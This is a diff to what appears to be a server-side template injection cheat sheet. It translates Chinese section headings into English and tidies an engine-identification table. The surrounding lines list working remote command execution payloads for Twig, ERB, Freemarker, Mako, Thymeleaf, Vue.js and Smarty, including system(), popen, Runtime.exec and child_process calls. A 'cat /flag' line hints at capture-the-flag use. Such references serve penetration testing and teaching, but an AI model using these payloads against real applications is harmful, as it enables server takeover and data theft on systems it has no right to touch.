@@ -3,8 +3,8 @@
 ## Template Engine Identification
 
 | Test payload | If the rendered result is | Engine |
-|-------------|--------------|------|
-| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
+|-------------|--------------------------|--------|
+| `{{7*7}}` | `49` | Jinja2 / Twig |
 | `{{7*7}}` | `{{7*7}}` | Not Jinja2/Twig |
 | `${7*7}` | `49` | Freemarker / Velocity / Mako |
 | `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
@@ -76,7 +76,7 @@
 {{['cat /flag']|filter('system')}}
 ```
 
-## ERB (Ruby) 注入链
+## ERB (Ruby) Injection Chains
 
 ```ruby
 <%= system('id') %>
@@ -85,34 +85,34 @@
 <%= IO.popen('id').readlines() %>
 ```
 
-## Freemarker 注入链
+## Freemarker Injection Chains
 
 ```
 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
 ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
-## Mako 注入链
+## Mako Injection Chains
 
 ```python
 ${__import__('os').popen('id').read()}
 <% import os %>${os.popen('id').read()}
 ```
 
-## Thymeleaf 注入链
+## Thymeleaf Injection Chains
 
 ```
 [[${T(java.lang.Runtime).getRuntime().exec('id')}]]
 [[${new java.lang.ProcessBuilder({'id'}).start()}]]
 ```
 
-## Vue.js 模板注入
+## Vue.js Template Injection
 
 ```javascript
 {{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
 ```
 
-## Smarty 注入链
+## Smarty Injection Chains
 
 ```
 {php}system('id');{/php}
